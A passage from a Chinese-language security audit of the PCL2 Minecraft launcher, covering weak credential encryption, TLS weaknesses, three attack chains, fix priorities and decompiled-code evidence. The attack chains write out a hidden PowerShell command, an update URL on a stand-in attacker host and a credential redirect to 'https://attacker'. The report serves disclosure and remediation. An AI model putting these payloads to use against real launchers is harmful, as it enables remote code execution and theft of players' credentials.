Logger.Info($"管理员权限：{WindowsUtils.HasAdminRole()}");
```
**危害**：MS AccessToken 与第三方认证密码以 DES（56 位有效密钥、固定 IV、密钥材料仅由本机可推导值构成）保护；而密钥材料 `Identify` 被**明文写入每次启动的日志**。用户按官方惯例上传日志求助时，攻击者只要再取得注册表项（同一份日志常附带环境信息）即可解密凭据。虽受"本地文件访问"限制，但**加密强度等价于编码**，属实质性缺陷。

### PCL2-2026-07 隐藏设置可安装"接受任意证书"回调 🟡

```csharp
new Setting("ToolDownloadCert", false, Sources.Registry, ...,
    a0 => ModNet.ShouldValidateSslCertificateOnLogin(Conversions.ToBoolean(a0)));
```
- 该设置**无 UI、无任何读取点**，只能被 `setup` 写入；写入触发 `OnChanged` → 安装进程级 `ServerCertificateValidationCallback`。
- 语义反转：`false` 反而意味着"对 `xboxlive` / `minecraftservices` **接受任意证书**"（`... && !Enabled`）。
- 连续两次 `setup`（先 `true` 后 `false`）即可确保回调被安装，之后对该两条微软令牌交换域实施中间人可截获 XBL/XSTS/ Minecraft 令牌。

### PCL2-2026-08 低版本系统启用 SSL3/TLS1.0 🟡

```csharp
if (Environment.OSVersion.Version < new Version(6, 2))   // < Windows 8
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | Tls | Tls11 | Tls12;
```
在 Win7 等系统上主动启用 **SSL 3.0**（POODLE）与 TLS 1.0，属降级风险；正常运维下不应保留 `Ssl3`。

---

## 5. 已验证的攻击链（按前置条件排序）

### 链 A：配置投递 → 持久化命令执行（无需更新包）

```
[前置] 取得 COS 桶写权限 / 可签发可信证书的链路中间人
  │  notice.json（无签名、无哈希）
  ├─ 无 buttons 公告 → 顶层 actions 自动执行（PCL-SILENT-001）
  ├─ actions.setup = { "LaunchAdvanceRun": "powershell -nop -w hidden -c ..." }
  │      └─ Settings.Set 白名单通过（该键合法）→ 写入 Setup.ini（持久化）
  └─ 用户下次启动游戏 → cmd.exe /c "<命令>" 静默执行（PCL2-2026-01）
```

### 链 B：配置投递 → 替换启动器本体（RCE 全链）

```
[前置] 同上
  │  ServerConfig.json（无签名）
  ├─ Update.Release.DownloadUrls = ["https://attacker/pcl.zip"]（或 PatchUrls）
  ├─ notice actions.update / slientupdate → HasUpdatePermission==true → UpdateStart()
  ├─ 下载 ZIP（仅 MinSize 校验）→ 解压覆盖 <base>\PCL\Plain Craft Launcher 2.exe
  │      （或 MsDelta.Apply 打补丁 → 同样无签名校验）
  └─ UpdateRestart() → 启动被替换的 exe → RCE（PCL-RCE-003 / PCL2-2026-03）
```

### 链 C：配置投递 → 登录凭据重定向

```
setup { "CacheAuthServerServer": "https://attacker", "LoginType": <authlib> }
  → 下次 authlib 登录：baseUrl = attacker + "/authserver" → 密码/令牌送至攻击者
（配合 PCL2-2026-07 的证书放宽，MS 令牌亦可被中间人截获）
```

> 三条链共用同一根因：**服务器下发内容无签名/无哈希，且动作框架对"能做什么"没有安全边界**。原文的根因判断是正确的，只是把"如何落地"的细节写错了几处。

---

## 6. 修复优先级建议

| 优先级 | 措施 | 解决对象 |
|---|---|---|
| P0 | 为 `ServerConfig.json` / `notice.json` / 更新包引入 **ECDSA 签名 + 哈希校验**；公钥内置，私钥离线保管 | 全部服务端内容类 |
| P0 | `setup` 改为**安全键白名单**：禁止 `LaunchAdvanceRun`、`LaunchAdvanceJvm/Game`、`CacheAuthServerServer`、`LoginType`、`SystemSystemCache` | NEW-01 / 04 / 07 |
| P1 | 移除 `HasUpdatePermission => true` 的硬编码旁路；`slientupdate` 需显式用户授权（一次性开关 + 审计） | NEW-03 |
| P1 | 更新包启用 `FileChecker { Hash = <SHA256> }`（能力已具备，仅需接线）；`MsDelta` 补丁同样校验 | RCE-003 / DL-001 |
| P1 | `Link.Argument` 改为**结构化参数**（逐项白名单，不接受整串），并校验可执行文件签名 | NEW-02 |
| P2 | `Identify` 从启动日志移除；凭据改用 DPAPI（`ProtectedData`，`CurrentUser` 作用域）替代 DES | NEW-06 |
| P2 | CurseForge API Key 改为服务端代理/短期令牌，禁止内置 | NEW-05 |
| P2 | 删除 `ToolDownloadCert` 这一"进程级 TLS 策略"设置；如需兼容，改为按 URL 显式豁免并弹窗告知 | NEW-07 |
| P3 | 移除 `Ssl3`；`notice.cfg` 改为结构化格式（JSON/键值）；`Val()` 换成显式 `TryParse` | PARSE-001 / NEW-08 |

---

## 7. 局限与未验证项

1. **未做动态调试**：所有结论来自静态反编译 + 依赖程序集源码级审查 + 一处针对性运行时实验（TLS 校验基准）。未在受控环境运行启动器以避免其向线上服务器发起真实请求。
2. **未验证服务端**：`ServerConfig.json` 线上内容的真实结构（`Update`、`Link`、`Custom` 等键）未取回，因此 NEW-02 的可利用面按"字段可被任意设置"评估，实际危害取决于 EasyTier 的参数语义。
3. **PCL 的 13 个内嵌依赖**已全部提取，但仅深入审查了 `MeloongCore`（`FileUtils`/`MsDelta`/`FileChecker`）与 `PCLCS` 的类型清单；`Newtonsoft.Json`/`CacheCow`/`NAudio` 等第三方库未做漏洞级审计（版本见上表，可按 CVE 库另行比对）。
4. **`FilterAccessToken` 的脱敏覆盖不完整**：仅匹配 `accessToken `（带空格）与"当前启动所持令牌"；若未来引入 URL 形式令牌，将失效。属观察项，未计入漏洞。
5. 原文 `PCL-DOS-001`、`PCL-INFO-002` 等低危/信息项未做动态验证（危害明确、静态证据充分）。

---

## 附录 A：核验产物

| 文件 | 内容 |
|---|---|
| `re_work/decomp/Plain Craft Launcher 2.decompiled.cs` | 全量反编译（88,510 行，501 类型） |
| `re_work/modsecret.cs` | `PCL.ModSecret` 单独导出（1,632 行） |
| `re_work/decomp_meloong/…` | `MeloongCore` 反编译（`FileUtils`/`MsDelta`/`FileChecker`） |
| `re_work/decomp_pclcs/…` | `PCLCS` 反编译 |
| `re_work/embedded/` | 13 个内嵌程序集原始镜像 |
| `re_work/types.txt` | 类型清单 |

## 附录 B：关键证据定位（反编译文件行号）

| 事实 | 位置 |
|---|---|
| 动作分发 switch | `decomp/…cs:23850-23888` |
| `HasUpdatePermission => true` | `modsecret.cs:386` |
| 更新 URL 取值 / 无哈希 | `decomp/…cs:22642-22679` |
| 更新落地（删 exe / 解压 / MsDelta） | `decomp/…cs:22691-22705` |
| `Latest.zip` 仅 MinSize | `decomp/…cs:23595-23602` |
| `Settings.Set` 白名单 | `decomp/…cs:71725-71731` |
| `LaunchAdvanceRun → cmd /c` | `decomp/…cs:58404-58448` |
| `SecretCdnSign` | `modsecret.cs:412-429` |
| `SecretHeadersSign` / CF Key | `decomp/…cs:22931-22960` |
| TLS 回调 | `decomp/…cs:52849-52864`、`71563-71566` |
| DNS→IP 改写 | `decomp/…cs:52731-52737` |
| `OpenWebsite` 白名单 | `decomp/…cs:88219-88227` |
| ZIP 穿越校验 | `decomp_meloong/…cs:4044-4048`、`4549-4558` |
| `UpdateReplace` 路径锚定 | `modsecret.cs:996-997` |
| `Identify` 生成 | `modsecret.cs:1576-1624` |
| `Identify` 入日志 | `decomp/…cs:78406` |
| DES 加密设置 | `decomp/…cs:71393` |
| 联机参数注入 | `decomp/…cs:38271-38293`、`38567-38580` |
| `Ssl3` 启用 | `decomp/…cs:78395` |
